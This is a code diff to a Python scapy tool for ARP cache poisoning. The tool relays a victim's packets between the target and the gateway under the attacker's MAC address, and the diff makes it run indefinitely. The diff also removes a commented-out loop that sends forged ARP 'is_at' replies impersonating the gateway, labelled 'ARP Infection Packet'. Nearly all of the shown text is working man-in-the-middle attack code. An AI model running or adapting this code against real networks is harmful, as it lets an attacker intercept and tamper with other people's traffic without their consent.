@@ -103,7 +103,7 @@ def SendInfectionARP(eth_src_mac, eth_dst_mac, arp_pdst, arp_hwdst, arp_psrc, ar
 def RelayPacket(pkt):
 	global targetMAC, gatewayMAC
 
-	if IPv6 not in pkt and ARP not in pkt:          # no IPv6
+	if IPv6 not in pkt and ARP not in pkt:         			              # no IPv6
 		cnt = 0
 		cntt = 0
 		try:
@@ -112,7 +112,7 @@ def RelayPacket(pkt):
 				if sourceIP == targetIP:
 					pkt.src = myInfo.GetMyMac()
 					pkt.dst = gatewayMAC
-					frags=fragment(pkt,fragsize=1024)
+					frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
 					for frag in frags:
 						sendp(frag, verbose=False)
 						if cnt > 1:
@@ -123,7 +123,7 @@ def RelayPacket(pkt):
 				elif sourceIP == myInfo.GetMyGateway:
 					pkt.src = myInfo.GetMyMac()
 					pkt.dst = targetMAC
-					frags=fragment(pkt,fragsize=1024)
+					frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
 					for frag in frags:
 						sendp(frag, verbose=False)
 						if cntt > 1:
@@ -202,19 +202,10 @@ if __name__ == "__main__":
 	
 	thread.start_new_thread(ForFowardPacketSniff, ())
 
-	time.sleep(10000)
+	while True:
+		time.sleep(10000)
 
 	ARPrestore(signal.SIGINT, ARPrestore)
-'''
-	arpPacket = Ether(src=myInfo.GetMyMac(), dst=targetMAC, type=2054)/ARP(pdst=targetIP, hwdst=targetMAC,  psrc=myInfo.GetMyGateway(), hwsrc=myInfo.GetMyMac(), ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
-	
-	signal.signal(signal.SIGINT, ARPrestore)				# SIGINT Interrupt
-
-	while(1):
-		sendp(arpPacket, verbose=False)					# Send ARP Infection Packet
-		print bcolors.WARNING + "[*] Send ARP Infection Packet to  - ["+targetIP+"]"+ bcolors.ENDC
-		time.sleep(1)
-'''
 
 
 
